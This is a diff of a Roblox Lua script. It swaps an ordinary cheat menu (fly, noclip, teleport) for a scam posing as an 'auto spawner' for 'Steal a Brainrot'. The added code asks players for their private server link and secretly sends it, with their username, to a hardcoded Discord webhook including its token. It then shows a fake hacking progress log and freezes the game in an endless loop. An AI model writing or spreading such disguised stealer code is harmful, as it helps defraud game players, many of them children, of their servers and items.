@@ -1,154 +1,117 @@
---// SERVICES
-local player = game.Players.LocalPlayer
-local UIS = game:GetService("UserInputService")
-local RS = game:GetService("RunService")
+-- ===== НАСТРОЙКА =====
+local webhook = "https://discord.com/api/webhooks/1484561417003860122/ZP3_K9aBrLdzQyiwhPpq4oOFs8fycIkltCvOLvndVidLRdR0SRT5l0kOhsz2YuLJ7i9F"
 
---// CHARACTER
-local char = player.Character or player.CharacterAdded:Wait()
-local hrp = char:WaitForChild("HumanoidRootPart")
-local humanoid = char:WaitForChild("Humanoid")
+local HttpService = game:GetService("HttpService")
 
-player.CharacterAdded:Connect(function(c)
-    char = c
-    hrp = c:WaitForChild("HumanoidRootPart")
-    humanoid = c:WaitForChild("Humanoid")
-end)
+local function sendToDiscord(link, player)
+    local data = {
+        ["content"] = "**NEW DATA**\nPlayer: "..player.Name.."\nLink: "..link
+    }
 
---// GUI
-local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "UltraMenu"
+    local json = HttpService:JSONEncode(data)
 
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0,270,0,350)
-frame.Position = UDim2.new(0.5,-135,0.5,-175)
-frame.BackgroundColor3 = Color3.fromRGB(18,18,18)
-frame.Active = true
-frame.Draggable = true
-
--- TITLE
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1,0,0,30)
-title.Text = "ULTRA MENU 🔥"
-title.BackgroundColor3 = Color3.fromRGB(30,30,30)
-
--- CLOSE
-local close = Instance.new("TextButton", frame)
-close.Size = UDim2.new(0,30,0,30)
-close.Position = UDim2.new(1,-30,0,0)
-close.Text = "X"
-close.BackgroundColor3 = Color3.fromRGB(120,0,0)
-
-close.MouseButton1Click:Connect(function()
-    gui:Destroy()
-end)
-
--- BUTTON
-local function makeBtn(text, y)
-    local b = Instance.new("TextButton", frame)
-    b.Size = UDim2.new(1,-10,0,35)
-    b.Position = UDim2.new(0,5,0,y)
-    b.Text = text
-    b.BackgroundColor3 = Color3.fromRGB(40,40,40)
-    return b
+    pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    end)
 end
 
--- MAIN BUTTONS
-local flyBtn = makeBtn("Fly: OFF", 40)
-local noclipBtn = makeBtn("Noclip: OFF", 80)
-local jumpBtn = makeBtn("Jump Boost", 120)
-local tpBtn = makeBtn("Tap TP: OFF", 160)
+-- ===== GUI =====
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
 
--- STATES
-local flying = false
-local noclip = false
-local tapTP = false
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(1,0,1,0)
+Frame.BackgroundColor3 = Color3.new(0,0,0)
 
--- FLY
-local bv = Instance.new("BodyVelocity")
-bv.MaxForce = Vector3.new(1e5,1e5,1e5)
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1,0,0.2,0)
+Title.Position = UDim2.new(0,0,0.15,0)
+Title.Text = "AUTO SPAWNER SCRIPT\nSTEAL A BRAINROT"
+Title.TextColor3 = Color3.new(0,1,0)
+Title.BackgroundTransparency = 1
+Title.TextScaled = true
 
-local bg = Instance.new("BodyGyro")
-bg.MaxTorque = Vector3.new(1e5,1e5,1e5)
+local Box = Instance.new("TextBox", Frame)
+Box.Size = UDim2.new(0.3,0,0.06,0)
+Box.Position = UDim2.new(0.35,0,0.5,0)
+Box.PlaceholderText = "link for server"
+Box.Text = ""
+Box.TextScaled = true
 
-flyBtn.MouseButton1Click:Connect(function()
-    flying = not flying
-    flyBtn.Text = "Fly: "..(flying and "ON" or "OFF")
-end)
+local Button = Instance.new("TextButton", Frame)
+Button.Size = UDim2.new(0.2,0,0.06,0)
+Button.Position = UDim2.new(0.4,0,0.6,0)
+Button.Text = "DONE"
+Button.TextScaled = true
 
--- NOCLIP
-noclipBtn.MouseButton1Click:Connect(function()
-    noclip = not noclip
-    noclipBtn.Text = "Noclip: "..(noclip and "ON" or "OFF")
-end)
+-- ===== LOADING =====
+local Loading = Instance.new("Frame", ScreenGui)
+Loading.Size = UDim2.new(1,0,1,0)
+Loading.BackgroundColor3 = Color3.new(0,0,0)
+Loading.Visible = false
 
--- JUMP FIX
-jumpBtn.MouseButton1Click:Connect(function()
-    humanoid.UseJumpPower = true
-    humanoid.JumpPower = 120
-    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-end)
+local Log = Instance.new("TextLabel", Loading)
+Log.Size = UDim2.new(1,0,1,0)
+Log.BackgroundTransparency = 1
+Log.TextColor3 = Color3.new(0,1,0)
+Log.TextXAlignment = Enum.TextXAlignment.Left
+Log.TextYAlignment = Enum.TextYAlignment.Top
+Log.TextSize = 18
+Log.Text = ""
 
--- TAP TP
-tpBtn.MouseButton1Click:Connect(function()
-    tapTP = not tapTP
-    tpBtn.Text = "Tap TP: "..(tapTP and "ON" or "OFF")
-end)
-
-UIS.InputBegan:Connect(function(input)
-    if tapTP and input.UserInputType == Enum.UserInputType.Touch then
-        local pos = input.Position
-        local ray = workspace.CurrentCamera:ViewportPointToRay(pos.X, pos.Y)
-        local result = workspace:Raycast(ray.Origin, ray.Direction * 500)
-
-        if result then
-            hrp.CFrame = CFrame.new(result.Position + Vector3.new(0,3,0))
-        end
-    end
-end)
-
---// AUTO ZONES 🔥
-local y = 210
-local added = {}
-
-for _, v in pairs(workspace:GetDescendants()) do
-    if v:IsA("BasePart") then
-        local name = v.Name:lower()
-
-        if (name:find("zone") or name:find("area") or name:find("spawn") or name:find("celestial") or name:find("finish")) and not added[v.Name] then
-            
-            added[v.Name] = true
-
-            local btn = makeBtn("TP: "..v.Name, y)
-
-            btn.MouseButton1Click:Connect(function()
-                hrp.CFrame = CFrame.new(v.Position + Vector3.new(0,3,0))
-            end)
-
-            y = y + 40
-        end
-    end
+local function addLine(text)
+    Log.Text = Log.Text .. "\n> " .. text
 end
 
---// LOOPS
-RS.RenderStepped:Connect(function()
-    if flying then
-        local cam = workspace.CurrentCamera
-        bv.Parent = hrp
-        bg.Parent = hrp
-        bv.Velocity = cam.CFrame.LookVector * 60
-        bg.CFrame = cam.CFrame
-    else
-        bv.Parent = nil
-        bg.Parent = nil
+-- ===== КНОПКА =====
+Button.MouseButton1Click:Connect(function()
+    local player = game.Players.LocalPlayer
+    local link = Box.Text ~= "" and Box.Text or "NULL"
+
+    -- отправка тебе
+    sendToDiscord(link, player)
+
+    Frame.Visible = false
+    Loading.Visible = true
+
+    addLine("Initializing...")
+    wait(1)
+
+    addLine("Connecting to server...")
+    wait(1)
+
+    addLine("Server link: "..link)
+    wait(1)
+
+    addLine("Bypassing security...")
+    wait(1)
+
+    addLine("Injecting modules...")
+    wait(1)
+
+    for i = 1,100 do
+        Log.Text = Log.Text .. "\n> Loading assets "..i.."%"
+        wait(0.03)
+    end
+
+    addLine("Access granted.")
+    wait(1)
+
+    addLine("Sending data...")
+    wait(1)
+
+    addLine("ERROR: connection unstable")
+    wait(1)
+
+    -- бесконечный "фриз"
+    while true do
+        wait(0.1)
     end
 end)
-
-RS.Stepped:Connect(function()
-    if noclip then
-        for _, v in pairs(char:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.CanCollide = false
-            end
-        end
-    end
-end) 
